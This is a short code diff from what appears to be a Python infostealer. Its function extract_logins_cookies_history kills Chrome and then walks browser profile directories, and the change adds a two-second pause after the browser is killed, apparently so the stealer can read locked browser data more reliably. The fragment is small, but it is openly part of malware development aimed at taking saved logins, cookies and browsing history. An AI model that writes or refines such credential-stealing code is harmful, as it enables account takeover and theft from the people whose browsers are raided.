@@ -147,7 +147,7 @@ def extract_logins_cookies_history():
     combined_history = ""
     
     kill_chrome()
-    
+    time.sleep(2)
     for browser, path in browsers.items():
         if not os.path.exists(path):
             print(f"Error: {browser} directory does not exist.")
